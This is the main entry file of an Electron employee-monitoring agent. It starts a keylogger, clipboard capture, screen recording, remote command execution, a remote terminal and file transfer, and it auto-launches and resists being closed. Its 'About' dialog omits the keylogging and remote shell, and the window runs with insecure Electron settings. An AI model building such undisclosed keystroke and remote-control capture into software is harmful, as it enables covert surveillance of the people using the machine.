/**
 * NetWatch Agent - Main Entry Point
 *
 * Restructured with modular architecture:
 * - /background-tasks - Scheduled tasks and monitoring
 * - /handlers - App lifecycle and IPC handlers
 * - /helpers - Utility functions for config, auth
 * - /screens - UI templates for dialogs
 * - /services - Core monitoring services
 * - /types - TypeScript interfaces
 * - /utils - Shared utilities
 */

import { app, BrowserWindow, Tray, Menu, nativeImage } from 'electron';
import * as path from 'path';
import * as crypto from 'crypto';
import Store from 'electron-store';
import AutoLaunch from 'auto-launch';

// Types
import { StoreSchema, ServiceRefs, AppState } from './types';

// Helpers
import { loadExternalConfig, getAssetPath } from './helpers/config';

// Utils
import { ScheduleConfig, DEFAULT_SCHEDULE, getScheduleDescription } from './utils/schedule';

// Handlers
import { setupPowerMonitoring, setupErrorHandlers } from './handlers/lifecycle';
import { promptForAdminPassword, promptForScheduleConfig, showFirstTimeSetup } from './handlers/ipc';

// Background Tasks
import { setupScheduleChecking, checkScheduleAndUpdateMonitoring } from './background-tasks/monitoring';

// Services
import { AgentService } from './services/agent-service';
import { ScreenCapture } from './services/screen-capture';
import { ProcessMonitor } from './services/process-monitor';
import { ActivityTracker } from './services/activity-tracker';
import { ClipboardMonitor } from './services/clipboard-monitor';
import { CommandExecutor } from './services/command-executor';
import { RemoteControl } from './services/remote-control';
import { TerminalService } from './services/terminal-service';
import { FileTransfer } from './services/file-transfer';
import { BlockingService } from './services/blocking-service';
import { ScreenRecorder } from './services/screen-recorder';
import { SystemRestrictions } from './services/system-restrictions';
import { KeyloggerService } from './services/keylogger-service';

// ============================================================================
// Configuration
// ============================================================================

const externalConfig = loadExternalConfig();

const store = new Store<StoreSchema>({
  defaults: {
    serverUrl: externalConfig.serverUrl || process.env.NETWATCH_SERVER_URL || '',
    autoStart: externalConfig.autoStart ?? true,
    screenshotInterval: externalConfig.screenshotInterval || 5000,
    activityLogInterval: externalConfig.activityLogInterval || 10000,
    adminPasswordHash: externalConfig.adminPasswordHash ||
      process.env.NETWATCH_ADMIN_PASSWORD_HASH ||
      crypto.createHash('sha256').update(crypto.randomBytes(32).toString('hex')).digest('hex'),
    schedule: externalConfig.schedule || DEFAULT_SCHEDULE,
  }
});

// ============================================================================
// State
// ============================================================================

const appState: AppState = {
  isMonitoringEnabled: false,
  scheduleCheckInterval: null,
};

const serviceRefs: ServiceRefs = {
  agentService: null,
  screenCapture: null,
  processMonitor: null,
  activityTracker: null,
  clipboardMonitor: null,
  commandExecutor: null,
  remoteControl: null,
  terminalService: null,
  fileTransfer: null,
  blockingService: null,
  screenRecorder: null,
  systemRestrictions: null,
  keyloggerService: null,
};

let mainWindow: BrowserWindow | null = null;
let tray: Tray | null = null;

// Auto-launch configuration
const autoLauncher = new AutoLaunch({
  name: 'NetWatch Agent',
  path: app.getPath('exe'),
  isHidden: false,
});

// ============================================================================
// Window & Tray
// ============================================================================

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 450,
    height: 350,
    show: false,
    frame: true,
    resizable: false,
    skipTaskbar: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    }
  });

  mainWindow.loadFile(path.join(__dirname, '../assets/index.html'));

  mainWindow.on('close', (event) => {
    if (!app.isQuitting) {
      event.preventDefault();
      mainWindow?.hide();
    }
  });
}

function createTray(): void {
  const iconPath = getAssetPath('tray-icon.png');
  let trayIcon: Electron.NativeImage;

  try {
    trayIcon = nativeImage.createFromPath(iconPath);
    if (trayIcon.isEmpty()) {
      trayIcon = createDefaultIcon();
    }
  } catch {
    trayIcon = createDefaultIcon();
  }

  tray = new Tray(trayIcon);
  tray.setToolTip('NetWatch Agent - Monitoring Active');
  updateTrayMenu('Connecting...');

  tray.on('double-click', () => {
    mainWindow?.show();
  });
}

function createDefaultIcon(): Electron.NativeImage {
  return nativeImage.createFromDataURL(
    'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAA7AAAAOwBeShxvQAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAKRSURBVFiF7ZZNaBNBFMf/s5tNskmapLZJNcRqi4gfIFgPXgQvgnjwIHjRk+DBgyAePHjx4smTJ0+ePHny5MmTJ0+ePEmpVKytxrYxTZOYzW52x8Mm3WSTbdLGg+APFnZn5v3f+83sziyQYII9xn+tAJYVQqBpGhYWFjA3NwdN04Y1iGMHECJE13UUi0WUy2VYljWiRRwrgBAhhmGgUChgeXkZpmkCgKIoqNVqaDabCAKW67pwXRdXrlyBLMuRNqMG6OsEQoSwLAuNRgO6riMIAgCAZVlYWVlBq9WCZVlQFAWu6+LixYuQJCnSLgqgbwJCCBiGAU3TIMsygiCAaZpYXV1Fq9VCs9kEAKiqCsdxcOHChQECQa0jU0CINAoYhgFd1yFJEoIggGEYWFtbQ7PZRKPRAABkMhk4joNz587t+PKuOsKkgGEY0DQNkiQhCAI0Gg1sbm6iXq+j0WjAdd1OWafTwdmzZ3cR4EIOIbBtG5qmQRRF+L6Pur6FjY0N1Go1NJtNNBoNdDqdTlk6ncapU6cgSRJ838/VarUuAkJ3DyGEgG3b0HUdgiDA932sr69ja2sL1WoVzWYTzWYTnU6nU5ZMJnH8+HGIogjf9/OVSmXXEBACQgjYto1CoQBBEOB5HtbW1lCpVFCpVNBsNtFqtdDpdDpl8Xgcx44dgyiK8DzveKlUGhiCkCm4vb0NXdchCAI8z0OpVEKlUkG5XO4QaLfbnbJYLIYjR45AEAT4vn+yUCjA87yB9YRA2Bew22lIkoQgCFAqlVAul1EqlToE2u12pywWi+HQoUMIguBksVjc0RQMnYKBQBgGVFWF53nIF4sol8soFosdAu12u1OmqioOHDgAAPB9/1Q+nz/h+/7uTcEx/gLsE/4DOi/VKKqBcccAAAAASUVORK5CYII='
  );
}

function updateTrayMenu(status: string): void {
  if (!tray) return;

  const schedule = store.get('schedule') as ScheduleConfig;

  const contextMenu = Menu.buildFromTemplate([
    {
      label: `Status: ${status}`,
      enabled: false,
    },
    {
      label: `Schedule: ${schedule.enabled ? 'Custom' : '24/7'}`,
      enabled: false,
    },
    { type: 'separator' },
    {
      label: 'Show Status Window',
      click: () => mainWindow?.show(),
    },
    {
      label: 'View Schedule',
      click: () => {
        const { dialog } = require('electron');
        dialog.showMessageBox({
          type: 'info',
          title: 'Monitoring Schedule',
          message: 'Current Schedule',
          detail: getScheduleDescription(schedule),
        });
      },
    },
    {
      label: 'About NetWatch',
      click: () => {
        const { dialog } = require('electron');
        dialog.showMessageBox({
          type: 'info',
          title: 'NetWatch Agent',
          message: 'NetWatch Employee Monitoring Agent',
          detail: 'Version 1.0.0\n\nThis agent monitors computer activity as per company policy.\n\nMonitoring includes:\n- Screen captures\n- Application usage\n- Website visits\n- Process activity',
        });
      },
    },
    { type: 'separator' },
    {
      label: 'Configure Schedule (Admin)',
      click: async () => {
        await promptForScheduleConfig(store, mainWindow, () => {
          setupScheduleChecking(store, serviceRefs, appState, updateTrayMenu);
        });
      },
    },
    {
      label: 'Exit (Admin Only)',
      click: async () => {
        await promptForAdminPassword(store, mainWindow);
      },
    },
  ]);

  tray.setContextMenu(contextMenu);
  tray.setToolTip(`NetWatch Agent - ${status}`);
}

// ============================================================================
// Services Initialization
// ============================================================================

async function initializeServices(): Promise<void> {
  const serverUrl = store.get('serverUrl') as string;

  // Initialize core agent service
  serviceRefs.agentService = new AgentService(serverUrl, store as any);

  // Initialize monitoring services
  serviceRefs.screenCapture = new ScreenCapture(serviceRefs.agentService);
  serviceRefs.processMonitor = new ProcessMonitor(serviceRefs.agentService);
  serviceRefs.activityTracker = new ActivityTracker(serviceRefs.agentService);
  serviceRefs.clipboardMonitor = new ClipboardMonitor(serviceRefs.agentService);
  serviceRefs.keyloggerService = new KeyloggerService(serviceRefs.agentService);

  // Initialize control services
  serviceRefs.commandExecutor = new CommandExecutor(serviceRefs.agentService);
  serviceRefs.remoteControl = new RemoteControl(serviceRefs.agentService);
  serviceRefs.terminalService = new TerminalService(serviceRefs.agentService);
  serviceRefs.fileTransfer = new FileTransfer(serviceRefs.agentService);
  serviceRefs.blockingService = new BlockingService(serviceRefs.agentService);
  serviceRefs.screenRecorder = new ScreenRecorder(serviceRefs.agentService);
  serviceRefs.systemRestrictions = new SystemRestrictions(serviceRefs.agentService);

  // Set up connection status callback
  serviceRefs.agentService.onConnectionChange((connected) => {
    if (appState.isMonitoringEnabled) {
      updateTrayMenu(connected ? 'Connected' : 'Disconnected');
    } else {
      updateTrayMenu('Paused (Scheduled)');
    }
  });

  // Connect to server
  await serviceRefs.agentService.connect();

  // Register command handlers
  serviceRefs.commandExecutor.registerHandlers();
  serviceRefs.remoteControl.registerHandlers();
  serviceRefs.terminalService.registerHandlers();
  serviceRefs.fileTransfer.registerHandlers();
  serviceRefs.systemRestrictions.registerHandlers();

  // Setup schedule checking
  setupScheduleChecking(store, serviceRefs, appState, updateTrayMenu);

  console.log('[App] All services initialized');
}

async function setupAutoStart(): Promise<void> {
  const autoStart = store.get('autoStart') as boolean;

  try {
    const isEnabled = await autoLauncher.isEnabled();

    if (autoStart && !isEnabled) {
      await autoLauncher.enable();
      console.log('[AutoStart] Enabled');
    } else if (!autoStart && isEnabled) {
      await autoLauncher.disable();
      console.log('[AutoStart] Disabled');
    }
  } catch (error) {
    console.error('[AutoStart] Failed to configure:', error);
  }
}

// ============================================================================
// Application Lifecycle
// ============================================================================

app.on('ready', async () => {
  console.log('[App] NetWatch Agent starting...');

  // Check if first-time setup is needed
  const serverUrl = store.get('serverUrl') as string;
  if (!serverUrl) {
    console.log('[App] No server URL configured, showing setup...');
    const setupComplete = await showFirstTimeSetup(store);
    if (!setupComplete) {
      console.log('[App] Setup cancelled, exiting...');
      app.quit();
      return;
    }
  }

  createWindow();
  createTray();
  await setupAutoStart();
  setupPowerMonitoring(serviceRefs.agentService, () => {
    checkScheduleAndUpdateMonitoring(store, serviceRefs, appState, updateTrayMenu);
  });

  try {
    await initializeServices();
    console.log('[App] NetWatch Agent is running');
  } catch (error) {
    console.error('[App] Failed to initialize services:', error);
    updateTrayMenu('Error');
  }
});

app.on('window-all-closed', () => {
  // Keep running in background
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

app.on('before-quit', () => {
  app.isQuitting = true;

  if (appState.scheduleCheckInterval) {
    clearInterval(appState.scheduleCheckInterval);
    appState.scheduleCheckInterval = null;
  }

  serviceRefs.screenCapture?.stop();
  serviceRefs.processMonitor?.stop();
  serviceRefs.activityTracker?.stop();
  serviceRefs.clipboardMonitor?.stop();
  serviceRefs.keyloggerService?.stop();
  serviceRefs.blockingService?.stop();
  serviceRefs.terminalService?.stopAll();
  serviceRefs.agentService?.disconnect();

  console.log('[App] NetWatch Agent stopped');
});

// Setup error handlers
setupErrorHandlers();
